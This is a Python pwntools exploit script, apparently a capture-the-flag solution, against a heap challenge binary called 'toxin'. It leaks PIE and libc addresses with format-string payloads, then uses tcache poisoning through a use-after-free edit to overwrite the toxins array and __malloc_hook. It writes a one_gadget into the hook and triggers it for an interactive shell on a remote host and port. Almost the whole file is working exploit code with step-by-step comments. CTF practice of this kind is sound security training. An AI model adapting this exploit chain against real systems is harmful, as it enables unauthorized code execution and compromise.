#!/usr/bin/python3

from pwn import *

exe = ELF("toxin_patched", checksec=False)
libc = ELF("./lib/libc.so.6", checksec=False)
ld = ELF("./lib/ld-2.27.so", checksec=False)

context.terminal = ['tmux', 'splitw', '-h', '-p', '70', '-I']
# context.binary = exe
context.log_level 	= "INFO"
isDebug = False

# brva 0x000013ee <-- malloc in add_toxin
# brva 0x000013ee
# brva 0x000016ae
gs = '''
continue
'''.format(**locals())

index = 0

def start_local(isDebug, argv=[], *a, **kw):
	if args.GDB or isDebug:
		return gdb.debug(exe.path, gdbscript=gs)
	else:
		return process([exe.path] + argv, *a, **kw)
		
def find_ip_offset(payload):
	io = process(elf.path)
	io.sendlineafter(b": ", payload)
	
	io.wait()
	
	#ip_offset = cyclic_find(io.corefile.pc) # x86
	ip_offset = cyclic_find(io.corefile.read(io.corefile.sp, 4))
	info("Located RIP offset at [%s]", ip_offset)
	return ip_offset

def brute_stringformat():
	for i in range (1, 30):
		io = start_local(False)
		io.recvuntil(b"> ")
		io.sendline(b"4")
		io.recvuntil(b"term: ")
		io.sendline(f"%{i}$p".encode())
		output = io.recvuntil(b"\n").decode().replace(" not found.", "").strip()
		info(f"Leak {i}: {output}")
		# get_vmmap(io)
		io.close()

def get_vmmap(proc):
    pid = proc.pid
    with open(f"/proc/{pid}/maps", 'r') as f:
        mappings = f.read()
    info(mappings)

def bypass_pie(io):
	info("Leaking binary...")
	io.recvuntil(b"> ")
	io.sendline(b"4")
	io.recvuntil(b"term: ")
	io.sendline(b"%9$p")
	output = io.recvS()
	binary_leak_int = int(output.split(" ")[0], 16)
	exe.address = binary_leak_int - 0x1284
	info(f"{hex(exe.address)=}")
	io.recvuntil(b"> ")

def bypass_aslr(io):
	info("Leaking libc...")
	io.sendline(b"4")
	io.recvuntil(b"term: ")
	io.sendline(b"%3$p")
	output = io.recvS()
	libc_leak_int = int(output.split(" ")[0], 16)
	libc.address = libc_leak_int - 0x110081
	info(f"{hex(libc.address)=}")
	info(io.recvuntil(b"> "))

def record_toxin(io, size:int, payload:bytes):
	global index
	info(f"Adding toxin... {index}")
	io.sendline(b"1")
	io.recvuntil(b"length: ")
	io.sendline(f"{size}".encode())
	io.recvuntil(b"index: ")
	io.sendline(f"{index}".encode())
	io.recvuntil(b"formula: ")
	io.sendline(payload)
	output = io.recvS()
	info(output)
	# io.recvuntil(b"> ")
	index += 1

	# if (index > 3):
	# 	error("Index above 2")
	# 	quit()

	return index - 1

def record_toxin_by_index(io, index:int, size:int, payload:bytes):
	info(f"Adding toxin by index... {index}")
	io.sendline(b"1")
	io.recvuntil(b"length: ")
	io.sendline(f"{size}".encode())
	io.recvuntil(b"index: ")
	io.sendline(f"{index}".encode())
	io.recvuntil(b"formula: ")
	io.sendline(payload)
	output = io.recvS()
	info(output)

def drink_toxin(io, index):
	info("Freeing toxin...")
	io.sendline(b"3")
	io.recvuntil(b"index: ")
	io.sendline(f"{index}".encode())
	output = io.recvS()
	info(output)
	# io.recvuntil(b"> ")

def edit_toxin(io, index, payload:bytes):
	info("Edit toxin...")
	io.sendline(b"2")
	io.recvuntil(b"index: ")
	io.sendline(f"{index}".encode())
	io.recvuntil(b"formula: ")
	io.sendline(payload)
	output = io.recvS()
	info(output)
	# io.recvuntil(b"> ")

#===========================================================
#                    EXPLOIT GOES HERE					   #
    # Arch:     amd64-64-little
    # RELRO:    Full RELRO
    # Stack:    No canary found
    # NX:       NX enabled
    # PIE:      PIE enabled
    # RUNPATH:  b'././lib'
#===========================================================

######## LOCAL ########
#ip_offset = find_ip_offset(cyclic(200))
#ip_offset = 56
# io = start_local(isDebug)
######## REMOTE ########
io = remote("206.189.27.45", 31513)
io.timeout = 1
# brute_stringformat()

bypass_pie(io)
bypass_aslr(io)

# Create a chunk 
chunkA = record_toxin(io, 0x68, b"A" * 8)

# send chunk to tcachebin (slot 0x70)
drink_toxin(io, chunkA)
info(f"toxinfreed = {hex(exe.sym.toxinfreed)}")

# we can still edit that "freed" chunk's user data. Set it to toxinfreed variable's address - 0x13 bytes.
# we use -0x13 because we can find a valid chunk size there (0x7f).
# next time we malloc we will be able to place a chunk that will pass the size check.
# Further more, &toxinfreed is before the toxins array and the sizes array. So we will overwrite &toxinfreed up to toxins and
# overwrite its [0] with the address of __malloc_hook and, [1] with 0 so we can malloc again.
edit_toxin(io, chunkA, p64(exe.sym.toxinfreed - 0x13))

# now the chunk in tcachebin points to exe.sym.toxinfreed - 0x13 instead of -> 0x0. We allocate the chunk back to get rid of it
record_toxin(io, 0x68, b"C" * 8)

# # we malloc again now the "fake chunk" we inserted to tcachebin and we get back the the memory address we injected. We over write upuntil &toxins where we set [0] to
# # the address of __malloc_hook. We also overwrite toxins[1] with 0 so we can malloc again one last time at the end.
record_toxin(io, 0x68, b"\x00"*43 + p64(libc.sym.__malloc_hook) + p64(0) * 3)

# # We can edit the malloced chunk and basically set its user data to a one_gadet. This will set __malloc_hook to it
info(f"{hex(libc.address + 0x10a38c)=}")
edit_toxin(io, 1 ,p64(libc.address + 0x10a38c))

# # now we malloc and one_gadget will execute 
record_toxin_by_index(io, 0, 0x68, b"")

io.interactive()

# changed the location I overwrote in toxins array. (notice \x00 * 43)